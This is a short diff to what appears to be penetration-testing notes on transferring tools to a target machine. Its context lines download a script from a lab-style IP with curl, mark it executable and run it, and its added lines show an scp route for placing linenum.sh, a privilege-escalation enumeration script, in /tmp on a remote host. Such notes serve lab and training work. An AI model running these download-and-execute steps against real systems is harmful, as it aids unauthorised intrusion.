@@ -6,6 +6,8 @@
 - `curl -O http://10.10.10.10/file.sh`
   - `chmod +x file.sh`
   - `./file.sh`
+- OR if have SSH access
+- `scp linenum.sh user@remotehost:/tmp/linenum.sh`
  
 #### Netcat
 - Local host
